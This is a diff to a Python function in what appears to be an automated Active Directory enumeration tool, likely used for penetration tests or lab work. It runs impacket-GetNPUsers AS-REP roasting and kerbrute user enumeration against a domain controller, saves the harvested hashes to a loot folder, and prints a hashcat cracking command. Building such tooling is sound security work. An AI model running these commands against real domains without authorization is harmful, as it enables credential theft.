@@ -502,19 +502,27 @@ def _run_post_domain_checks(
     findings: Findings, ws: Workspace, available: set[str],
 ):
     """
-    Domain-gated checks that require the complete users.txt assembled
-    across all parallel handlers (LDAP + SMB + enum4linux-ng).
-    Runs sequentially after phase 3 so the user list is final.
+    Domain-gated checks that run after all parallel handlers complete so the
+    user list (assembled from LDAP + SMB + enum4linux-ng) is final.
+    Runs even when users.txt is absent — still writes the section and notes.
     """
     users_file = ws.loot_dir / "users.txt"
-    if not users_file.exists() or users_file.stat().st_size == 0:
-        return
+    has_users = users_file.exists() and users_file.stat().st_size > 0
 
     findings.h2("Post-Enumeration: Domain Checks")
-    findings.bullet(f"Domain: `{domain}` — user list: `{users_file}` ({sum(1 for _ in users_file.open())} accounts)")
+    if has_users:
+        findings.bullet(
+            f"Domain: `{domain}` — user list: `{users_file}` "
+            f"({sum(1 for _ in users_file.open())} accounts)"
+        )
+    else:
+        findings.bullet(
+            f"Domain: `{domain}` — no users found via LDAP/SMB; "
+            f"AS-REP roasting and kerbrute require a user list"
+        )
 
     # AS-REP roasting — full user list, catches accounts LDAP UAC flag missed
-    if "impacket-GetNPUsers" in available:
+    if has_users and "impacket-GetNPUsers" in available:
         cmd = [
             "impacket-GetNPUsers", f"{domain}/",
             "-no-pass", "-dc-ip", ip,
@@ -533,9 +541,14 @@ def _run_post_domain_checks(
                         hf.write(line.strip() + "\n")
             findings.bullet(f"**Hash saved:** `{hash_file}` — `hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt`")
             findings.add_summary(f"**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
+    elif not has_users:
+        findings.note(
+            f"AS-REP roasting (run once users are known): "
+            f"`impacket-GetNPUsers {domain}/ -no-pass -dc-ip {ip} -request -format hashcat -usersfile loot/users.txt`"
+        )
 
     # Kerbrute username validation against the discovered user list
-    if "kerbrute" in available:
+    if has_users and "kerbrute" in available:
         cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain, str(users_file)]
         findings.cmd(" ".join(cmd2))
         out2 = runner.run(cmd2, "post_kerbrute_userenum", timeout=300)
